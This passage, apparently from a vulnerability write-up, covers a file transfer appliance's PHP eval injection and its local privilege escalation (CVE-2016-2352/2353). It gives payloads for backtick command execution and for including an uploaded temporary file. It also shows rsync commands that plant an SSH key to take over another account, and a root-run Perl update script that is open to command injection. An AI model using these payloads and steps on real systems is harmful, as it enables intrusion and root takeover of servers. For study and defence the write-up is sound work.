        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/[\\\/&quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(count(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, array(&quot;nickname&quot;=&amp;gt;&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;))));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, &quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If Known-Secret-Key has been acquired, the output of decrypt( $_POST[fc] ) will be controllable. And despite that the succeeding regular expressions work as a function name whitelist filter, they do not filter parameters.&lt;br /&gt;
Therefore, the only restriction for injecting random codes in the parameters is to exclude &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;)&lt;/code&gt; in the strings. But thanks to the flexible characteristic of PHP, there are lots of ways to manipulate, just to name two examples here.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Execute system commands directly by using backticks (`)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);
&lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A more elegant way: use the syntax INCLUDE to include the tmp_name of the uploaded files, so that any protection will give way.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;After gaining PHP page privileges, we discovered that the privileges were assigned to user nobody. In order to engage in advanced recon, the web environment had been observed. After the observation, two possible privilege escalation vulnerabilities were identified.&lt;/p&gt;

&lt;h5 id=&quot;1-incorrect-rsync-configuration&quot;&gt;1. Incorrect Rsync Configuration&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;log file = /home/soggycat/log/kennel.log
...
[soggycat]
path = /home/soggycat
uid = soggycat
read only = false
list = false
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The module name soggycat is readable and writable to anyone for the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt;, therefore the SSH Key can be written into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/.ssh/&lt;/code&gt; and then use the soggycat credential to login.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        4096 2016/01/29 18:13:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;         606 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_dsa.pub &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_dsa &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&apos;0,0.0.0.0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in ‚Äúyum-client.pl‚Äù&lt;/h5&gt;

&lt;p&gt;To enable system updates through web UI, the sudoers configuration in FTA exceptionally allows the user nobody to directly execute commands with root privileges and update software with the program &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
Cmnd_Alias      YUM_UPGRADE = /usr/bin/yum -y upgrade
Cmnd_Alias      YUM_CLIENT = /usr/local/bin/yum-client.pl
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root     ALL=(ALL) &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt;
admin    &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
nobody   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
soggycat &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
radmin   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YUM_CLIENT&lt;/code&gt; is the command for proceeding updates. Part of the codes are as follows:&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cdrom=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;appid=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;servername=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;version=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;token=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/usr/bin/yum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;`;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/etc/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/home/seos/log/yum.diff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf-5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;unable to mount: $!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

